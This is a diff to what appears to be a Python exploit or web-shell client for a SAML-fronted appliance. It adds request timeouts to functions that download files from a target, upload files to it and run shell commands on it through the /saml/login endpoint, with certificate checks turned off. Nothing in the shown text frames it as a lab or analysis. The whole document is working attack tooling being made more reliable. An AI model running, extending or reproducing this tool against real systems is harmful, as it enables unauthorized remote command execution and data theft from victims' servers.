@@ -15,6 +15,8 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
+g_sleep_time = 3
+
 entry_api = "/saml/login"
 tmp_apis = ["/lang/custom/sjis.json"]
 
@@ -171,14 +173,14 @@ def action_download(target, file_path):
 
     post_data = "%s=%s&%s=%s" % (str_maps["action"], str_maps["download"], str_maps["path"], file_path)
     try:
-        session.post(req_url, post_data, verify=False)
+        session.post(req_url, post_data, verify=False, timeout=g_sleep_time)
     except requests.exceptions.RequestException as e:
         pass
 
     for tmp_api in tmp_apis:
         req_url = urllib.parse.urljoin(target, tmp_api)
         dir_path = os.path.join("./files", "%s_%d" % get_host_port_from_url(target))
-        resp = session.get(req_url, verify=False, stream=True)
+        resp = session.get(req_url, verify=False, stream=True, timeout=g_sleep_time)
         if resp.status_code == 200:
             if not os.path.exists(dir_path):
                 os.makedirs(dir_path)
@@ -214,7 +216,7 @@ def action_upload(target, local_file_path, remote_file_path, offset=0, log=True)
         post_data = "%s=%s&%s=%s&%s=%d&%s=%s" % (str_maps["action"], str_maps["upload"], str_maps["path"], remote_file_path, str_maps["status"], status, str_maps["data"], hex_data)
 
         try:
-            session.post(req_url, data=post_data, verify=False)
+            session.post(req_url, data=post_data, verify=False, timeout=g_sleep_time)
         except requests.exceptions.RequestException as e:
             pass
     
@@ -234,7 +236,7 @@ def action_shell(target, shell_cmd, get_resp=True, log=True, print_resp=True, cl
     post_data = "%s=%s&%s=%s" % (str_maps["action"], str_maps["shell"], str_maps["path"], shell_cmd_encoded)
 
     try:
-        session.post(req_url, data=post_data, verify=False)
+        session.post(req_url, data=post_data, verify=False, timeout=g_sleep_time)
     except requests.exceptions.RequestException as e:
         pass
 
@@ -245,7 +247,7 @@ def action_shell(target, shell_cmd, get_resp=True, log=True, print_resp=True, cl
 
     for tmp_api in tmp_apis:
         req_url = urllib.parse.urljoin(target, tmp_api)
-        resp = session.get(req_url, verify=False, stream=True)
+        resp = session.get(req_url, verify=False, stream=True, timeout=g_sleep_time)
         if resp.status_code == 200:
             print("[+] F010012")
             data = resp.raw.read().decode("utf-8")
